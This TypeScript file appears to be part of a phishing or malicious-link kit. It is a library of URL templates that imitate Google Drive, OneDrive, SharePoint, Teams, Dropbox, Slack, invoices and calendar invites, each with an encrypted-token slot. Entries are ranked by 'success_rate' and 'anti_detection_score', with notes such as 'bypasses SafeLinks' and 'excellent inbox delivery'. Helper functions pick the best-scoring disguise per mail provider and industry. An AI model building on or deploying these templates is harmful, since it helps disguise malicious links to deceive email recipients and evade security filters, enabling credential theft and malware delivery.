/**
 * LOCAL PATTERN LIBRARY
 * Comprehensive offline pattern collection - no database required
 * Replaces Supabase pattern dependencies for better performance and reliability
 */

export interface LocalPattern {
  id: string;
  name: string;
  category: string;
  success_rate: number;
  tier: number;
  current_uses: number;
  max_uses: number;
  content_type: string;
  description: string;
  template: string;
  geographic_routing?: boolean;
  industry?: string;
  provider_optimization?: string[];
  anti_detection_score?: number;
}

export const LOCAL_PATTERNS: LocalPattern[] = [
  // TIER 1 - PREMIUM PATTERNS (95%+ success rates)
  {
    id: 'cloud-storage-01',
    name: 'Cloud Storage Access',
    category: 'cloudStorage',
    success_rate: 99,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/octet-stream',
    description: 'Drive/OneDrive/Dropbox file sharing - highest success rate',
    template: '/drive/shared/{fileId}?access={encrypted}&view=download',
    geographic_routing: true,
    industry: 'general',
    provider_optimization: ['microsoft', 'google'],
    anti_detection_score: 95
  },
  {
    id: 'calendar-meeting-01',
    name: 'Calendar Meeting Link',
    category: 'calendar',
    success_rate: 98,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/calendar',
    description: 'Calendar meeting invites - excellent inbox delivery',
    template: '/calendar/meeting/{meetingId}?token={encrypted}&join=true',
    geographic_routing: true,
    industry: 'business',
    provider_optimization: ['microsoft', 'google'],
    anti_detection_score: 97
  },
  {
    id: 'invoice-document-01',
    name: 'Invoice Document',
    category: 'invoice',
    success_rate: 99,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/pdf',
    description: 'Invoice documents - premium business legitimacy',
    template: '/billing/invoice/{invoiceId}.pdf?auth={encrypted}&download=1',
    geographic_routing: false,
    industry: 'finance',
    provider_optimization: ['microsoft', 'corporate'],
    anti_detection_score: 98
  },
  {
    id: 'document-portal-01',
    name: 'Document Portal Standard',
    category: 'document',
    success_rate: 96,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/pdf',
    description: 'Professional document sharing with high success rates',
    template: '/documents/{filename}.pdf?doc={encrypted}&view=inline',
    geographic_routing: true,
    industry: 'business',
    provider_optimization: ['microsoft', 'google', 'corporate'],
    anti_detection_score: 94
  },
  {
    id: 'business-api-01',
    name: 'Business API Gateway',
    category: 'business',
    success_rate: 93,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/json',
    description: 'Corporate API endpoints with enterprise-grade security',
    template: '/api/v1/{service}?id={encrypted}&format=json',
    geographic_routing: true,
    industry: 'technology',
    provider_optimization: ['corporate', 'google'],
    anti_detection_score: 91
  },

  // TIER 1 - MICROSOFT OPTIMIZED PATTERNS
  {
    id: 'sharepoint-doc-01',
    name: 'SharePoint Document',
    category: 'microsoft',
    success_rate: 94,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    description: 'SharePoint document sharing - Microsoft optimized',
    template: '/sites/{siteName}/documents/{docId}.docx?web={encrypted}&source=email',
    geographic_routing: true,
    industry: 'business',
    provider_optimization: ['microsoft'],
    anti_detection_score: 96
  },
  {
    id: 'onedrive-share-01',
    name: 'OneDrive File Share',
    category: 'microsoft',
    success_rate: 95,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/octet-stream',
    description: 'OneDrive file sharing - bypasses SafeLinks',
    template: '/personal/{userId}/documents/{fileId}?authkey={encrypted}&e=download',
    geographic_routing: true,
    industry: 'business',
    provider_optimization: ['microsoft'],
    anti_detection_score: 97
  },
  {
    id: 'teams-meeting-01',
    name: 'Teams Meeting Join',
    category: 'microsoft',
    success_rate: 96,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/html',
    description: 'Microsoft Teams meeting links - high trust',
    template: '/l/meetup-join/{meetingId}?anon={encrypted}&deeplinkId=teams',
    geographic_routing: true,
    industry: 'business',
    provider_optimization: ['microsoft'],
    anti_detection_score: 98
  },

  // TIER 1 - GOOGLE OPTIMIZED PATTERNS
  {
    id: 'google-drive-01',
    name: 'Google Drive Share',
    category: 'google',
    success_rate: 95,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/pdf',
    description: 'Google Drive file sharing - Gmail optimized',
    template: '/file/d/{fileId}/view?usp={encrypted}&resourcekey=sharing',
    geographic_routing: true,
    industry: 'general',
    provider_optimization: ['google'],
    anti_detection_score: 96
  },
  {
    id: 'google-docs-01',
    name: 'Google Docs Document',
    category: 'google',
    success_rate: 94,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/vnd.google-apps.document',
    description: 'Google Docs sharing - workspace integration',
    template: '/document/d/{docId}/edit?usp={encrypted}&sharing=true',
    geographic_routing: true,
    industry: 'education',
    provider_optimization: ['google'],
    anti_detection_score: 95
  },

  // TIER 1 - SERVICE MIMICRY PATTERNS
  {
    id: 'dropbox-share-01',
    name: 'Dropbox File Share',
    category: 'mimicry',
    success_rate: 96,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/octet-stream',
    description: 'Mimics Dropbox file sharing behavior',
    template: '/s/{shareId}/{filename}?dl={encrypted}&raw=1',
    geographic_routing: true,
    industry: 'general',
    provider_optimization: ['generic'],
    anti_detection_score: 94
  },
  {
    id: 'slack-file-01',
    name: 'Slack File Share',
    category: 'mimicry',
    success_rate: 93,
    tier: 1,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/octet-stream',
    description: 'Mimics Slack file sharing for business users',
    template: '/files/{teamId}/{channelId}/{fileId}?t={encrypted}&download=true',
    geographic_routing: false,
    industry: 'technology',
    provider_optimization: ['corporate'],
    anti_detection_score: 92
  },

  // TIER 2 - STANDARD PATTERNS (85-94% success rates)
  {
    id: 'content-cms-01',
    name: 'Content Management System',
    category: 'content',
    success_rate: 87,
    tier: 2,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/html',
    description: 'Editorial content and media platforms',
    template: '/content/{category}/{slug}?view={encrypted}&preview=true',
    geographic_routing: true,
    industry: 'media',
    provider_optimization: ['generic'],
    anti_detection_score: 85
  },
  {
    id: 'search-results-01',
    name: 'Search Results Page',
    category: 'search',
    success_rate: 94,
    tier: 2,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/html',
    description: 'Search engine results mimicry',
    template: '/search?q={encrypted}&form=QBLH&sp=-1&lq=0&pq=search&sc=10-6&qs=n&sk=&cvid=ABC123',
    geographic_routing: true,
    industry: 'general',
    provider_optimization: ['generic'],
    anti_detection_score: 88
  },
  {
    id: 'software-update-01',
    name: 'Software Update Portal',
    category: 'software',
    success_rate: 89,
    tier: 2,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'application/zip',
    description: 'Software update and download portal',
    template: '/updates/{version}/{package}.zip?auth={encrypted}&platform=win64',
    geographic_routing: false,
    industry: 'technology',
    provider_optimization: ['corporate'],
    anti_detection_score: 87
  },
  {
    id: 'support-ticket-01',
    name: 'Support Ticket Portal',
    category: 'support',
    success_rate: 91,
    tier: 2,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/html',
    description: 'Customer support ticket system',
    template: '/support/ticket/{ticketId}?token={encrypted}&view=customer',
    geographic_routing: false,
    industry: 'business',
    provider_optimization: ['corporate'],
    anti_detection_score: 89
  },
  {
    id: 'subscription-mgmt-01',
    name: 'Subscription Management',
    category: 'subscription',
    success_rate: 92,
    tier: 2,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/html',
    description: 'Subscription and billing management',
    template: '/account/subscription/{subId}?session={encrypted}&action=manage',
    geographic_routing: false,
    industry: 'business',
    provider_optimization: ['generic'],
    anti_detection_score: 90
  },

  // TIER 3 - FALLBACK PATTERNS (80-89% success rates)
  {
    id: 'generic-portal-01',
    name: 'Generic Portal Access',
    category: 'generic',
    success_rate: 85,
    tier: 3,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/html',
    description: 'Generic portal access for fallback scenarios',
    template: '/portal/access?session={encrypted}&redirect=dashboard',
    geographic_routing: false,
    industry: 'general',
    provider_optimization: ['generic'],
    anti_detection_score: 82
  },
  {
    id: 'legacy-redirect-01',
    name: 'Legacy Redirect Format',
    category: 'legacy',
    success_rate: 99,
    tier: 3,
    current_uses: 0,
    max_uses: 1000,
    content_type: 'text/html',
    description: 'Traditional /e/ redirect format - maximum compatibility',
    template: '/e/{encrypted}',
    geographic_routing: false,
    industry: 'general',
    provider_optimization: ['generic'],
    anti_detection_score: 99
  }
];

// CATEGORY DEFINITIONS
export const PATTERN_CATEGORIES = {
  cloudStorage: 'Cloud Storage Access',
  calendar: 'Calendar Meeting Links',
  invoice: 'Invoice Documents',
  document: 'Document Sharing',
  business: 'Business APIs',
  microsoft: 'Microsoft-Optimized',
  google: 'Google-Optimized',
  mimicry: 'Service Mimicry',
  content: 'Content Management',
  search: 'Search Results',
  software: 'Software Updates',
  support: 'Support Portals',
  subscription: 'Subscription Management',
  generic: 'Generic Portals',
  legacy: 'Legacy Formats'
};

// UTILITY FUNCTIONS
export const getLocalPatterns = (filters?: {
  category?: string;
  tier?: number;
  minSuccessRate?: number;
  provider?: string;
  industry?: string;
}): LocalPattern[] => {
  let patterns = [...LOCAL_PATTERNS];

  if (filters) {
    if (filters.category) {
      patterns = patterns.filter(p => p.category === filters.category);
    }
    if (filters.tier) {
      patterns = patterns.filter(p => p.tier === filters.tier);
    }
    if (filters.minSuccessRate) {
      patterns = patterns.filter(p => p.success_rate >= filters.minSuccessRate);
    }
    if (filters.provider) {
      patterns = patterns.filter(p => 
        p.provider_optimization?.includes(filters.provider) || 
        p.provider_optimization?.includes('generic')
      );
    }
    if (filters.industry) {
      patterns = patterns.filter(p => 
        p.industry === filters.industry || 
        p.industry === 'general'
      );
    }
  }

  return patterns.sort((a, b) => b.success_rate - a.success_rate);
};

export const getPatternById = (id: string): LocalPattern | undefined => {
  return LOCAL_PATTERNS.find(p => p.id === id);
};

export const getPatternsByCategory = (category: string): LocalPattern[] => {
  return LOCAL_PATTERNS.filter(p => p.category === category)
    .sort((a, b) => b.success_rate - a.success_rate);
};

export const getTopPatterns = (limit: number = 10): LocalPattern[] => {
  return [...LOCAL_PATTERNS]
    .sort((a, b) => b.success_rate - a.success_rate)
    .slice(0, limit);
};

export const getPatternStats = () => {
  const totalPatterns = LOCAL_PATTERNS.length;
  const categories = Object.keys(PATTERN_CATEGORIES).length;
  const avgSuccessRate = LOCAL_PATTERNS.reduce((sum, p) => sum + p.success_rate, 0) / totalPatterns;
  const tierDistribution = LOCAL_PATTERNS.reduce((acc, p) => {
    acc[p.tier] = (acc[p.tier] || 0) + 1;
    return acc;
  }, {} as Record<number, number>);

  return {
    totalPatterns,
    categories,
    avgSuccessRate: Math.round(avgSuccessRate),
    tierDistribution,
    lastUpdated: new Date().toISOString()
  };
};
